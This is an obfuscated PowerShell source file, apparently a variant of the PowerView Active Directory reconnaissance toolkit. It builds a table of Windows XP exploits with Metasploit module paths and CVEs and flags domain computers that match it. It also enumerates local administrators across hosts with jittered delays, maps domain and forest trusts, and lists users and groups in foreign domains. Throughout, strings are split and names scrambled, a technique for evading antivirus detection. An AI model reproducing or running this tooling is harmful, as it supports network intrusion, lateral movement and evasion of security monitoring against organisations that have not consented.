    ${Nu`lL} = ${Ta`BLE`E`XpLoiTs}."r`ows".("{1}{0}"-f 'd','Ad').Invoke(("{1}{0}{2}"-f'nd','Wi','ows XP'),("{0}{3}{1}{4}{2}" -f 'Service Pa','k','2','c',' '),("{5}{3}{0}{1}{4}{6}{7}{9}{2}{8}" -f 'lo','it/windo','ms06_06','p','ws/','ex','sm','b','6_nwapi','/'),("{7}{1}{4}{5}{9}{6}{3}{8}{0}{10}{2}"-f'/cve/','//www.c','06-4688','i','v','ede','a','http:','ls.com','t','20'))  
    ${n`ULL} = ${T`A`B`LEeXPLoITS}."Ro`Ws".("{1}{0}"-f 'dd','A').Invoke(("{2}{0}{1}"-f'ws ','XP','Windo'),("{2}{0}{1}"-f 'vi','ce Pack 2','Ser'),("{8}{0}{6}{2}{10}{7}{4}{9}{5}{1}{3}" -f 'x','wks','l','svc','s/smb/ms06_0','_','p','indow','e','70','oit/w'),("{2}{10}{4}{5}{3}{1}{6}{8}{7}{0}{11}{9}"-f'-46','www.c','ht','/','p',':/','vedetails','com/cve/2006','.','1','t','9'))  
    ${N`UlL} = ${t`A`Bl`eeXPLo`ITS}."r`Ows".("{1}{0}"-f 'd','Ad').Invoke(("{2}{0}{1}" -f'dows',' XP','Win'),("{2}{3}{4}{0}{1}" -f 'ck',' 2','Ser','v','ice Pa'),("{6}{8}{1}{5}{0}{4}{3}{7}{2}" -f 'o','t/win','api','s','ws/','d','exp','mb/ms08_067_net','loi'),("{3}{6}{4}{1}{2}{0}{5}" -f 'tails.c','.cved','e','http:/','ww','om/cve/2008-4250','/w'))  
    ${NU`lL} = ${TABL`eexplo`its}."R`Ows".("{1}{0}"-f'dd','A').Invoke(("{1}{2}{0}"-f 'XP','Win','dows '),("{0}{3}{2}{1}" -f'Servi','Pack 2',' ','ce'),("{7}{8}{3}{4}{0}{9}{6}{10}{2}{1}{5}"-f 'do','1_spool','0_06','/w','in','ss','s/sm','e','xploit','w','b/ms1'),("{4}{9}{10}{0}{7}{2}{6}{3}{11}{1}{5}{8}"-f 've','com/cve/2010-2','tai','s','h','72','l','de','9','ttp://ww','w.c','.'))  
    ${n`Ull} = ${TA`B`leEXpLOIts}."R`OWs".("{0}{1}" -f'A','dd').Invoke(("{2}{1}{3}{0}"-f' XP','ndo','Wi','ws'),("{0}{1}{2}"-f 'Servi','ce Pac','k 3'),("{3}{5}{0}{1}{6}{4}{2}" -f'dows/smb','/','8_067_netapi','exploi','0','t/win','ms'),("{5}{0}{4}{3}{6}{2}{1}" -f '/www.cved','8-4250','ve/200','.com','etails','http:/','/c'))  
    ${n`ULL} = ${TaB`Leex`PL`OiTs}."Ro`Ws".("{0}{1}"-f'A','dd').Invoke(("{0}{1}{2}{3}"-f'Wi','nd','ows',' XP'),("{0}{1}{2}"-f 'S','ervice P','ack 3'),("{3}{5}{8}{9}{0}{6}{7}{1}{2}{4}"-f 'ndows','pool','s','ex','s','plo','/smb/ms10_06','1_s','i','t/wi'),("{0}{5}{1}{9}{4}{8}{6}{2}{3}{7}{10}"-f'ht','w.cv','ails.co','m/','d','tp://ww','t','cve/20','e','e','10-2729'))  
    ${n`ULL} = ${Ta`Ble`eXplOITS}."r`OWs".("{0}{1}" -f'Ad','d').Invoke(("{1}{0}{3}{2}"-f'i','W','dows XP','n'),"",("{8}{2}{1}{5}{9}{6}{0}{4}{3}{7}" -f 'erpc/','t/','loi','6_d','ms03_02','w','ws/dc','com','exp','indo'),("{6}{8}{4}{2}{7}{9}{0}{1}{5}{10}{3}"-f '/cv','e/200','v','/','.c','3-03','http://ww','edetails.','w','com','52'))  
    ${n`ULL} = ${t`AblEExp`LOITS}."rO`Ws".("{1}{0}" -f'd','Ad').Invoke(("{1}{2}{0}" -f' XP','Windo','ws'),"",("{3}{4}{0}{7}{5}{1}{6}{2}" -f'oi','dc','smq','exp','l','/','erpc/ms05_017_m','t/windows'),("{5}{1}{6}{3}{4}{2}{0}{7}" -f '/2005-005','ww.','/cve','tails','.com','http://w','cvede','9'))  
    ${N`ULL} = ${tAB`L`ee`xPLOi`Ts}."r`OwS".("{0}{1}"-f'A','dd').Invoke(("{1}{2}{0}"-f 'ws XP','Win','do'),"",("{4}{2}{5}{1}{0}{3}"-f '/ms06_040_n','s/smb','ind','etapi','exploit/w','ow'),("{4}{2}{9}{7}{3}{6}{8}{1}{5}{0}" -f'9','006-','w.cv','ils.com/cv','http://ww','343','e','eta','/2','ed'))  
    ${n`ULl} = ${t`ABlE`e`xPlo`its}."RO`Ws".("{0}{1}" -f 'A','dd').Invoke(("{0}{2}{1}{3}" -f'Wi','dow','n','s XP'),"",("{2}{6}{10}{0}{9}{8}{4}{3}{7}{1}{5}" -f '/ms','t','exploit/windows/','067_n','_','api','sm','e','8','0','b'),("{1}{8}{6}{4}{5}{3}{2}{0}{7}"-f 'o','http','c','ls.','w.cvedet','ai','/ww','m/cve/2008-4250',':/'))  

    
    &("{2}{1}{0}"-f'rbose','e','Write-V') ("{9}{6}{2}{0}{15}{3}{11}{8}{12}{13}{5}{7}{1}{10}{4}{14}" -f'ng ',' le','i','e','ls','rable OS ','ck','and SP','s','[*] Che','ve','r',' fo','r vulne','...','comput')

    
    
    

    
    ${ta`BLeV`UlNCOmp`U`TeRs} = &("{2}{0}{1}" -f 'w-O','bject','Ne') ("{3}{2}{5}{4}{6}{1}{0}" -f 'taTable','.Da','y','S','em.Dat','st','a') 
    ${nU`ll} = ${tA`Ble`VuL`NComPUt`ers}."C`OL`UmNS".("{0}{1}"-f 'A','dd').Invoke(("{0}{3}{2}{1}" -f 'C','uterName','p','om'))
    ${N`UlL} = ${TABLe`VuLN`ComP`Ut`e`RS}."C`OlUm`Ns".("{0}{1}" -f 'Ad','d').Invoke(("{2}{1}{0}" -f'tem','Sys','Operating'))
    ${nu`lL} = ${TA`Bl`EVuln`C`OMPUTe`Rs}."COLUM`Ns".("{1}{0}" -f'd','Ad').Invoke(("{0}{2}{1}" -f'Servi','ck','cePa'))
    ${n`ULL} = ${TAbl`evUl`NCOMp`UT`e`RS}."Co`lU`MNS".("{1}{0}"-f 'dd','A').Invoke(("{0}{1}{2}" -f'Las','t','Logon'))
    ${nu`Ll} = ${TaB`leV`UL`NcOMPuters}."c`OLUMNs".("{0}{1}" -f 'A','dd').Invoke(("{1}{0}{2}" -f'ul','MsfMod','e'))
    ${Nu`Ll} = ${tAB`LEV`UL`N`cOmpuTErs}."col`UM`Ns".("{0}{1}" -f'Ad','d').Invoke('CVE')

    
    ${tA`Blee`XpL`Oits} | &("{0}{1}{3}{2}" -f 'Fo','rEac','ct','h-Obje') {
                 
        ${eXP`loit`Os} = ${_}."o`PeRATiN`gs`yst`Em"
        ${EXpl`oi`Tsp} = ${_}."Se`RVi`c`EpAck"
        ${EX`PLOIT`MSf} = ${_}."M`sFm`OdUlE"
        ${EXP`LoIt`cVe} = ${_}."C`Ve"

        
        ${TA`BLeAD`Scompu`TeRs} | &("{1}{0}{2}{3}{4}"-f'orEach','F','-','Obj','ect') {
            
            ${ad`ShOsTna`ME} = ${_}."Hos`T`NAmE"
            ${ad`s`OS} = ${_}."opeR`AtingsY`s`T`em"
            ${A`dsSp} = ${_}."Ser`VIce`P`ACK"                                                        
            ${ads`LasT} = ${_}."l`A`StLogon"
            
            
            if (${Ad`S`oS} -like "$ExploitOS*" -and ${ADs`sp} -like "$ExploitSP" ) {                    
                
                ${n`UlL} = ${TaBLE`VUlNcoMp`U`TErS}."r`oWs".("{1}{0}"-f 'dd','A').Invoke(${AD`SHo`StnA`mE},${ad`S`Os},${ad`sSP},${a`DSLaSt},${eXP`L`o`ItMsF},${EX`PlOI`Tc`VE})
            }
        }
    }     
    
    
    ${Vu`lNcOM`pu`Ter} = ${TabLEvuL`N`cOmp`Ut`Ers} | &("{2}{3}{1}{0}" -f 'ect','bj','Se','lect-O') ("{1}{2}{0}"-f 'terName','Com','pu') -Unique | &("{0}{3}{1}{2}"-f'Me','-Obje','ct','asure')
    ${vU`lNCOmP`UTERcOu`Nt} = ${vUL`Nc`omp`UT`eR}."cO`UnT"
    if (${VUL`NCoM`PU`TER}."C`Ount" -gt 0) {
        
        &("{0}{1}{2}"-f'Writ','e-Ver','bose') ('['+'+] '+'F'+'ound'+' '+"$VulnComputerCount "+'po'+'tential'+'l'+'y '+'vul'+'ner'+'able '+'sy'+'stem'+'s!')
        ${TA`BlevUlnc`OMPu`Te`RS} | &("{2}{1}{3}{0}"-f 't','rt','So','-Objec') { ${_}."L`ASTl`ogon" -as [datetime]} -Descending
    }
    else {
        &("{0}{1}{2}"-f 'Write-','Verb','ose') ("{5}{4}{0}{1}{6}{7}{8}{3}{2}" -f'o',' v','re found.','s we',' N','[-]','ulnerable ','syst','em')
    }
}


function INVOKe-e`NuM`E`RA`TeLOCaladMIN {


    [CmdletBinding()]
    param(
        [Parameter(pOsitIon=0,vAluefROmPIPeline=${tR`UE})]
        [Alias({"{0}{1}"-f 'Host','s'})]
        [String[]]
        ${compu`T`eRn`AME},

        [ValidateScript({&("{1}{0}" -f 'Path','Test-') -Path ${_} })]
        [Alias({"{0}{1}{2}"-f'Host','Lis','t'})]
        [String]
        ${COM`PUTE`R`FIlE},

        [String]
        ${C`OM`puTErFI`LtEr},

        [String]
        ${CoMpu`TerA`dS`patH},

        [Switch]
        ${N`oPInG},

        [UInt32]
        ${d`E`lAy} = 0,

        [Double]
        ${j`it`TER} = .3,

        [String]
        ${o`UtfIle},

        [Switch]
        ${noCL`ob`BEr},

        [Switch]
        ${t`Ru`sTgROUPS},

        [String]
        ${DO`ma`iN},

        [String]
        ${dOm`A`i`Nc`oNtRo`LLer},

        [Switch]
        ${s`eA`R`chfor`est},

        [ValidateRange(1,100)] 
        [Int]
        ${Th`R`eaDS}
    )

    begin {
        if (${p`SbO`U`NDPAramEtE`RS}[("{0}{1}"-f'D','ebug')]) {
            ${DEBuGp`ReF`eRen`cE} = ("{0}{2}{1}" -f 'C','e','ontinu')
        }

        
        ${Ra`N`dnO} = &("{0}{3}{1}{2}"-f'New-','j','ect','Ob') ("{1}{2}{0}{3}"-f '.Rando','Sys','tem','m')

        &("{2}{0}{1}{3}" -f 'ite-Verb','o','Wr','se') ('['+'*] '+'Run'+'nin'+'g '+'Invoke-'+'Enumer'+'a'+'teLocalAdm'+'i'+'n '+'wit'+'h '+'d'+'elay '+'o'+'f '+"$Delay")

        
        if(${COMpU`TeRF`Ile}) {
            ${COM`puTEr`N`A`me} = &("{0}{2}{1}{3}" -f 'Ge','te','t-Con','nt') -Path ${C`Om`pUterFile}
        }

        if(!${coMP`UtE`Rn`AMe}) { 
            [array]${cOmPUtE`R`NA`ME} = @()

            if(${Do`mAIN}) {
                ${TA`RGet`D`Oma`ins} = @(${D`omA`IN})
            }
            elseif(${s`EArc`h`FOre`St}) {
                
                ${TARG`et`do`m`AINs} = &("{5}{2}{1}{3}{0}{4}"-f'ai','restD','t-NetFo','om','n','Ge') | &("{3}{2}{1}{0}" -f 'ect','-Obj','orEach','F') { ${_}."n`AMe" }
            }
            else {
                
                ${t`ArGe`T`do`MainS} = @( (&("{3}{2}{0}{1}"-f'oma','in','et-NetD','G'))."n`AmE" )
            }

            ForEach (${D`OmaIN} in ${tA`R`gET`dOMAInS}) {
                &("{2}{0}{1}" -f'ite-','Verbose','Wr') ('[*]'+' '+'Q'+'ueryi'+'ng '+'dom'+'a'+'in '+"$Domain "+'for'+' '+'h'+'osts')
                ${cOm`P`UTern`AmE} += &("{0}{1}{2}{3}"-f 'Get-','Ne','tComput','er') -Filter ${CoMputer`F`i`lTEr} -ADSpath ${co`mpUtER`A`DspA`TH} -Domain ${DoM`A`iN} -DomainController ${dOm`AIn`CoN`TROlLeR}
            }
            
            
            ${co`M`puTeR`Name} = ${coM`pU`T`e`RNamE} | &("{3}{2}{0}{1}" -f '-Ob','ject','ere','Wh') { ${_} } | &("{0}{1}{2}"-f'Sort-O','b','ject') -Unique | &("{2}{1}{0}" -f 'bject','O','Sort-') { &("{0}{2}{1}"-f 'Get-Ra','dom','n') }
            if($(${Com`PuT`e`RNAMe}."CO`UNt") -eq 0) {
                throw ("{2}{4}{0}{3}{1}" -f'un','!','No hosts ','d','fo')
            }
        }

        
        if(!${no`cLO`BB`ER}) {
            if (${o`UtfiLE} -and (&("{2}{1}{0}" -f'Path','st-','Te') -Path ${O`UtFI`le})) { &("{0}{1}{3}{2}" -f'Remo','ve-I','em','t') -Path ${oUt`FIlE} }
        }

        if(${tr`USTGR`oU`Ps}) {
            
            &("{2}{1}{3}{0}{4}"-f 'b','ite-V','Wr','er','ose') ("{0}{1}{3}{2}{4}{5}" -f'Determining domain',' trus',' ','t','g','roups')

            
            ${Tru`stgRo`UpN`AMES} = &("{4}{1}{3}{2}{5}{0}"-f 'p','-For','g','ei','Find','nGrou') -Domain ${dO`mA`iN} -DomainController ${d`oM`AIN`cO`NtroLL`eR} | &("{0}{3}{1}{2}" -f'For','-Obj','ect','Each') { ${_}."GR`OUPNa`me" } | &("{1}{2}{0}"-f 'ct','Sort-O','bje') -Unique

            ${T`Ru`stG`Rou`pSSIdS} = ${TRu`stg`RoUPN`Ames} | &("{2}{3}{1}{0}" -f 'ject','ach-Ob','F','orE') { 
                
                
                &("{3}{0}{2}{1}" -f 't','p','Grou','Get-Ne') -Domain ${d`OM`AIn} -DomainController ${D`oM`AINCO`NtR`oLL`eR} -GroupName ${_} -FullData | &("{0}{3}{1}{2}" -f'Where-','ec','t','Obj') { ${_}."oB`je`CTSId" -notmatch ("{1}{2}{3}{0}"-f'44','S-1','-5-3','2-5') } | &("{1}{0}{2}{3}{4}" -f 'rEa','Fo','ch-','Obj','ect') { ${_}."oBj`E`CtsID" }
            }

            
            ${domai`NS`id} = &("{1}{3}{0}{2}" -f'D','Get','omainSID','-') -Domain ${doM`AIn}
        }

        
        ${hOST`e`NUmblo`CK} = {
            param(${coMP`U`TerNaMe}, ${p`ing}, ${Out`F`ile}, ${DO`m`A`iNSId}, ${trUs`T`gr`ouPS`SIDs})

            
            ${u`P} = ${t`RUe}
            if(${p`iNg}) {
                ${U`p} = &("{2}{3}{0}{1}" -f'nect','ion','T','est-Con') -Count 1 -Quiet -ComputerName ${cOM`PU`TeRName}
            }
            if(${u`p}) {
                
                ${lo`cAlAdM`ins} = &("{5}{2}{4}{0}{3}{1}"-f'oca','roup','t-','lG','NetL','Ge') -ComputerName ${coM`pu`Tername}

                
                if(${DOM`AIN`sID} -and ${TrusTg`Rou`ps`iDS}) {
                    
                    ${LOC`Als`iD} = (${lO`cAla`DmInS} | &("{1}{3}{2}{0}" -f't','Where-','c','Obje') { ${_}."s`id" -match (('.*-50'+'0'+'TuH')."R`eP`LaCe"('TuH',[StriNG][ChAr]36)) })."s`id" -replace "-500$"

                    
                    
                    ${lOcALAdM`I`NS} = ${Loca`La`DMIns} | &("{2}{1}{0}"-f 'ct','ere-Obje','Wh') { (${t`RUST`GROu`Pssids} -contains ${_}."S`ID") -or ((-not ${_}."s`Id".("{2}{1}{0}" -f'th','i','startsW').Invoke(${L`OCAl`sId})) -and (-not ${_}."S`Id".("{2}{0}{1}" -f 'ta','rtsWith','s').Invoke(${dOMa`iNS`id}))) }
                }

                if(${L`OcalAd`MiNs} -and (${L`OcAl`Ad`mIns}."LEN`gth" -ne 0)) {
                    
                    if(${OU`T`FILe}) {
                        ${l`ocala`DmI`Ns} | &("{1}{2}{0}{3}" -f'CS','Export-Po','werView','V') -OutFile ${OuT`Fi`lE}
                    }
                    else {
                        
                        ${LOcaL`A`DmI`Ns}
                    }
                }
                else {
                    &("{2}{0}{1}{4}{3}" -f 'ite-','Ver','Wr','se','bo') ('[!]'+' '+'No'+' '+'users'+' '+'r'+'eturned '+'fr'+'om '+"$Server")
                }
            }
        }

    }

    process {

        if(${T`HRE`AdS}) {
            &("{2}{3}{1}{0}"-f 'e','os','Writ','e-Verb') ('Usi'+'ng '+'threa'+'din'+'g '+'wi'+'th '+'thre'+'a'+'ds '+'= '+"$Threads")

            
            ${s`CrIP`Tp`A`Rams} = @{
                ("{1}{0}"-f 'ng','Pi') = $(-not ${NOpi`Ng})
                ("{0}{1}" -f 'OutFil','e') = ${o`UtfILe}
                ("{2}{0}{1}" -f'omain','SID','D') = ${d`OMA`i`NSiD}
                ("{3}{0}{1}{2}{4}"-f'rust','GroupsSI','D','T','s') = ${tr`UstG`Rou`pSSIdS}
            }

            
            &("{2}{5}{1}{0}{3}{4}"-f'adedF','Thre','Invo','uncti','on','ke-') -ComputerName ${CO`MP`UtErNAme} -ScriptBlock ${HOStENU`mB`l`OCK} -ScriptParameters ${s`cR`IpTpARAmS}
        }

        else {
            if(-not ${n`opinG} -and (${C`omp`UteRNA`Me}."cO`UNt" -ne 1)) {
                
                ${p`InG} = {param(${CO`MPU`TE`RNamE}) if(&("{2}{0}{1}{4}{3}"-f't-C','onn','Tes','ction','e') -ComputerName ${cOMpu`T`ER`NAme} -Count 1 -Quiet -ErrorAction ("{1}{0}" -f'p','Sto')){${CoM`P`UTE`RnamE}}}
                ${coMpUt`er`NAme} = &("{5}{4}{0}{2}{1}{3}"-f '-Thread','un','edF','ction','oke','Inv') -NoImports -ComputerName ${CoMp`UTE`RnA`Me} -ScriptBlock ${pI`NG} -Threads 100
            }

            &("{1}{3}{0}{2}" -f'Verbos','W','e','rite-') "[*] Total number of active hosts: $($ComputerName.count) "
            ${cOuN`TEr} = 0

            ForEach (${COMpUt`er} in ${coM`P`UTe`RnAME}) {

                ${c`OuntER} = ${cOunT`eR} + 1

                
                &("{1}{0}{2}" -f 'le','Start-S','ep') -Seconds ${Ra`NdNo}.("{1}{0}" -f't','Nex').Invoke((1-${JIt`T`Er})*${d`elAy}, (1+${JI`TT`er})*${deL`AY})

                &("{0}{1}{2}{3}" -f 'Wr','ite-','Verbo','se') "[*] Enumerating server $Computer ($Counter of $($ComputerName.count)) "
                &("{3}{0}{2}{4}{1}"-f 'oke','d','-C','Inv','omman') -ScriptBlock ${h`OS`TE`NuMBlO`ck} -ArgumentList ${c`Om`PUteR}, ${FA`l`se}, ${O`Ut`FiLE}, ${dOm`A`InsiD}, ${trust`GRo`UpS`SiDS}
            }
        }
    }
}








function GEt-nE`T`d`OMAiNtrU`st {


    [CmdletBinding()]
    param(
        [Parameter(POsiTIon=0,vAluEFromPiPELIne=${T`Rue})]
        [String]
        ${doMa`iN} = (&("{0}{4}{1}{2}{3}"-f 'Get-','t','D','omain','Ne'))."N`AmE",

        [String]
        ${d`oM`A`i`NConTroLleR},

        [Switch]
        ${L`DAp},

        [ValidateRange(1,10000)] 
        [Int]
        ${P`A`g`esIZE} = 200
    )

    process {
        if(${l`dAp} -or ${DO`Ma`inc`o`N`TRolleR}) {

            ${TR`U`STSeaR`CHeR} = &("{0}{2}{1}{3}" -f 'Get-','mainSear','Do','cher') -Domain ${DOmA`In} -DomainController ${doMAIn`cOn`T`R`OlLer} -PageSize ${Pag`eS`iZe}

            if(${Tru`ST`s`eA`Rcher}) {

                ${tRU`sTsEarc`H`er}."fi`l`TER" = ((("{7}{1}{2}{6}{0}{4}{5}{3}"-f 'r','jectCl','ass','n))','ustedDoma','i','=t','(&(ob')))

                ${tRUS`T`SEa`Rch`eR}.("{1}{0}" -f 'All','Find').Invoke() | &("{1}{2}{0}"-f'ject','W','here-Ob') {${_}} | &("{4}{2}{0}{3}{1}"-f'Ob','ct','rEach-','je','Fo') {
                    ${pr`oPS} = ${_}."prO`p`erTieS"
                    ${dO`ma`Int`RusT} = &("{0}{1}{2}"-f'Ne','w-Ob','ject') ("{0}{1}{2}"-f'P','SOb','ject')
                    ${TrUST`A`TtRiB} = Switch (${p`Rops}."T`RUSt`AtT`RIButEs")
                    {
                        0x001 { ("{2}{3}{0}{1}"-f 'ansitiv','e','non_t','r') }
                        0x002 { ("{2}{3}{1}{0}" -f 'y','_onl','upl','evel') }
                        0x004 { ("{4}{2}{0}{1}{3}" -f'_dom','ai','rantined','n','qua') }
                        0x008 { ("{2}{4}{3}{0}{1}" -f't_tr','ansitive','fo','s','re') }
                        0x010 { ("{5}{2}{1}{0}{4}{3}"-f 'iz','_organ','ross','n','atio','c') }
                        0x020 { ("{2}{0}{1}" -f 'fores','t','within_') }
                        0x040 { ("{0}{1}{2}{3}" -f 'trea','t_as_','exte','rnal') }
                        0x080 { ("{0}{1}{3}{2}{4}" -f 'trust_uses_rc4_en','cry','io','pt','n') }
                        0x100 { ("{0}{3}{4}{2}{1}" -f'trust_us','ys','_ke','es_a','es') }
                        ("{0}{1}"-f 'Defaul','t') { 
                            &("{3}{4}{0}{2}{1}"-f 'arni','g','n','Write-','W') "Unknown trust attribute: $($Props.trustattributes) ";
                            "$($Props.trustattributes)";
                        }
                    }
                    ${D`ire`cTION} = Switch (${P`RopS}."TR`Us`TDirEc`TI`ON") {
                        0 { ("{0}{1}{2}"-f'D','i','sabled') }
                        1 { ("{2}{0}{1}"-f'bou','nd','In') }
                        2 { ("{2}{1}{0}" -f 'nd','tbou','Ou') }
                        3 { ("{1}{4}{3}{2}{0}" -f'nal','B','io','rect','idi') }
                    }
                    ${oB`J`ectGUId} = &("{1}{0}{2}"-f 'ew-Obj','N','ect') ("{0}{1}"-f'Gu','id') @(,${pR`O`pS}."OB`J`eCT`Guid"[0])
                    ${d`OmAInt`RuSt} | &("{1}{2}{0}"-f 'r','Add-Mem','be') ("{3}{1}{0}{2}"-f't','er','y','Noteprop') ("{2}{0}{1}" -f'c','eName','Sour') ${D`oMain}
                    ${D`oMaI`NTRuSt} | &("{1}{0}{2}" -f'Mem','Add-','ber') ("{1}{2}{0}{3}"-f 'ep','No','t','roperty') ("{2}{0}{1}{3}"-f'arget','Na','T','me') ${PRo`Ps}."nA`Me"[0]
                    ${dOMAINTR`U`ST} | &("{2}{3}{0}{1}"-f 'Me','mber','Ad','d-') ("{1}{2}{0}{3}"-f 'eproper','No','t','ty') ("{0}{2}{1}"-f 'Obje','tGuid','c') "{$ObjectGuid}"
                    ${dOm`AinTRu`St} | &("{1}{0}{2}{3}" -f'm','Add-Me','b','er') ("{1}{0}{2}{3}"-f 'teprope','No','r','ty') ("{2}{1}{0}"-f'ype','tT','Trus') "$TrustAttrib"
                    ${dOM`AIN`TRuST} | &("{0}{2}{1}"-f 'Ad','Member','d-') ("{1}{0}{3}{2}"-f 'teproper','No','y','t') ("{0}{1}{2}"-f'T','rustDire','ction') "$Direction"
                    ${D`OM`AiNT`RUSt}
                }
            }
        }

        else {
            
            ${fO`U`NdDOmaIN} = &("{0}{1}{2}"-f'Get-NetD','omai','n') -Domain ${D`OmAIN}
            
            if(${f`ounD`D`omAiN}) {
                (&("{1}{2}{3}{0}{4}" -f'ai','Get-NetD','o','m','n') -Domain ${D`omA`In}).("{4}{1}{6}{2}{5}{0}{3}"-f 'stRelati','et','lT','onships','G','ru','Al').Invoke()
            }     
        }
    }
}


function g`Et`-NeTFOREStT`RuSt {


    [CmdletBinding()]
    param(
        [Parameter(poSitIoN=0,VAluEFRoMPiPelINe=${Tr`Ue})]
        [String]
        ${fOre`ST}
    )

    process {
        ${fOU`NdFOr`eST} = &("{1}{2}{4}{3}{0}"-f't','Get-','NetFo','es','r') -Forest ${Fo`R`ESt}
        if(${FOUn`D`FORest}) {
            ${Fou`Nd`F`OresT}.("{1}{2}{5}{3}{0}{6}{4}"-f 'ons','Get','AllTru','ti','s','stRela','hip').Invoke()
        }
    }
}


function f`IND-f`O`ReIgN`UsER {


    [CmdletBinding()]
    param(
        [String]
        ${uSEr`Na`mE},

        [String]
        ${D`omAIN},

        [String]
        ${Do`MaInCO`NT`RoLLeR},

        [Switch]
        ${Ld`Ap},

        [Switch]
        ${R`E`curSE},

        [ValidateRange(1,10000)] 
        [Int]
        ${pa`G`ESiZe} = 200
    )

    function gE`T-`F`OreignusEr {
        
        param(
            [String]
            ${u`S`e`RnamE},

            [String]
            ${d`o`maiN},

            [String]
            ${Doma`iNco`N`TROL`lEr},

            [ValidateRange(1,10000)] 
            [Int]
            ${pa`g`EsiZE} = 200
        )

        if (${d`oMA`in}) {
            
            ${DIstIn`G`U`ISheddOmA`INnaMe} = "DC=" + ${do`Main} -replace '\.',("{0}{1}" -f ',DC','=')
        }
        else {
            ${d`IsTi`N`guIs`HeDDOMaiNnAme} = [String] ([adsi]'')."DIS`T`in`gUISheD`NA`Me"
            ${DoM`Ain} = ${DI`sT`iNG`UISHeDDOMaINna`mE} -replace 'DC=','' -replace ',','.'
        }

        &("{1}{0}{2}" -f't-Net','Ge','User') -Domain ${D`omAIn} -DomainController ${doMaIN`CoNT`Ro`lLEr} -UserName ${uSern`AME} -PageSize ${Pa`geSi`ZE} | &("{2}{3}{1}{0}"-f 'ect','bj','Where','-O') {${_}."m`emBE`Rof"} | &("{3}{2}{0}{1}" -f'h','-Object','c','ForEa') {
            ForEach (${mEM`Be`RSh`ip} in ${_}."M`Em`BeROf") {
                ${InD`Ex} = ${MEmBeR`sh`Ip}.("{2}{1}{0}" -f 'f','O','Index').Invoke("DC=")
                if(${INd`Ex}) {
                    
                    ${gRo`UP`d`OMain} = $(${m`EMb`E`RsHip}.("{1}{2}{0}" -f'ing','subst','r').Invoke(${I`N`DEx})) -replace 'DC=','' -replace ',','.'
                    
                    if (${g`R`oUPDOm`Ain}.("{1}{0}{2}" -f 'm','Co','pareTo').Invoke(${Do`m`AIn})) {
                        
                        ${G`Roupna`me} = ${mEmberS`h`iP}.("{0}{1}" -f 'spl','it').Invoke(",")[0].("{1}{0}"-f 'lit','sp').Invoke("=")[1]
                        ${f`OrEiGn`UsER} = &("{1}{2}{0}"-f 'ject','New-O','b') ("{2}{1}{0}"-f 'bject','O','PS')
                        ${FOr`EignUs`ER} | &("{2}{0}{1}" -f 'd-Membe','r','Ad') ("{3}{2}{1}{0}"-f'rty','ope','epr','Not') ("{2}{0}{1}" -f 'Dom','ain','User') ${doM`AIN}
                        ${FoR`eiG`N`USER} | &("{0}{1}{2}"-f 'Add-Memb','e','r') ("{1}{2}{3}{0}"-f 'y','Notepr','o','pert') ("{0}{1}" -f 'UserNa','me') ${_}."saMAc`cOunt`NaME"
                        ${FO`R`Eig`NUSEr} | &("{0}{2}{1}" -f 'Ad','ber','d-Mem') ("{3}{1}{0}{2}"-f 'r','rope','ty','Notep') ("{2}{3}{1}{0}" -f'n','i','GroupDo','ma') ${GROup`do`MA`iN}
                        ${F`OreIGn`USeR} | &("{1}{2}{0}" -f'r','Add','-Membe') ("{2}{1}{0}" -f 'erty','eprop','Not') ("{0}{1}{2}"-f'Gr','oupN','ame') ${grouPN`A`me}
                        ${forEi`gNUS`Er} | &("{0}{2}{1}" -f 'Add-Mem','er','b') ("{1}{2}{0}" -f'perty','No','tepro') ("{0}{1}" -f 'Gr','oupDN') ${m`eM`BERSHip}
                        ${F`OR`EigNUsEr}
                    }
                }
            }
        }
    }

    if (${r`Ecu`RSE}) {
        
        if(${L`Dap} -or ${Do`M`AINCo`NtR`OLlER}) {
            ${dO`M`AinTr`USts} = &("{0}{2}{3}{5}{1}{4}" -f 'In','ainTr','vo','ke-','ust','MapDom') -LDAP -DomainController ${d`OmAI`Ncon`TRoL`l`er} -PageSize ${PA`gEsi`ze} | &("{1}{2}{0}" -f't','ForEa','ch-Objec') { ${_}."s`OURceD`Oma`in" } | &("{2}{1}{0}"-f 't','-Objec','Sort') -Unique
        }
        else {
            ${D`OmAinT`Ru`StS} = &("{1}{3}{0}{4}{2}{5}" -f'Map','Invo','omai','ke-','D','nTrust') -PageSize ${p`Ag`eS`iZe} | &("{1}{3}{4}{2}{0}" -f'ect','For','j','Each-','Ob') { ${_}."sO`U`RcEDoMA`iN" } | &("{1}{0}{2}" -f'o','S','rt-Object') -Unique
        }

        ForEach(${DoMa`intR`U`st} in ${D`OMAiN`TrUS`TS}) {
            
            &("{2}{0}{1}" -f '-V','erbose','Write') ('Enume'+'rati'+'n'+'g '+'t'+'ru'+'st '+'groups'+' '+'i'+'n '+'doma'+'in '+"$DomainTrust")
            &("{2}{1}{3}{0}"-f'eignUser','et-Fo','G','r') -Domain ${dOMA`iNTR`USt} -UserName ${u`SErna`mE} -PageSize ${p`Ag`EsiZE}
        }
    }
    else {
        &("{1}{0}{2}{3}{4}"-f 't-F','Ge','orei','gnUs','er') -Domain ${do`mA`IN} -DomainController ${doMAin`c`on`TR`oLLeR} -UserName ${us`er`NAme} -PageSize ${PA`ge`Size}
    }
}


function FInd-Fo`Re`ig`NGrouP {


    [CmdletBinding()]
    param(
        [String]
        ${gR`ou`pName} = '*',

        [String]
        ${dO`mA`IN},

        [String]
        ${D`oM`A`IncO`NTRolLer},

        [Switch]
        ${l`daP},

        [Switch]
        ${r`eCUR`Se},

        [ValidateRange(1,10000)] 
        [Int]
        ${pAge`s`Ize} = 200
    )

    function GET-F`oreI`G`Ng`RoUp {
        param(
            [String]
            ${G`R`oUpNamE} = '*',

            [String]
            ${d`oMAIn},

            [String]
            ${DO`maI`Nc`O`NtrOllEr},

            [ValidateRange(1,10000)] 
            [Int]
            ${Pa`ge`SizE} = 200
        )

        if(-not ${DoM`AIn}) {
            ${d`O`MAiN} = (&("{0}{1}{3}{2}" -f 'Get-N','etD','ain','om'))."N`AMe"
        }

        ${d`O`MaInDN} = "DC=$($Domain.Replace('.', ',DC='))"
        &("{1}{3}{0}{2}" -f 'os','Writ','e','e-Verb') ('Do'+'mainDN:'+' '+"$DomainDN")

        
        ${ex`Clu`deGrou`Ps} = @(("{0}{1}" -f 'U','sers'), ("{2}{0}{3}{1}"-f 'ain U','s','Dom','ser'), ("{0}{1}" -f 'Gue','sts'))

        
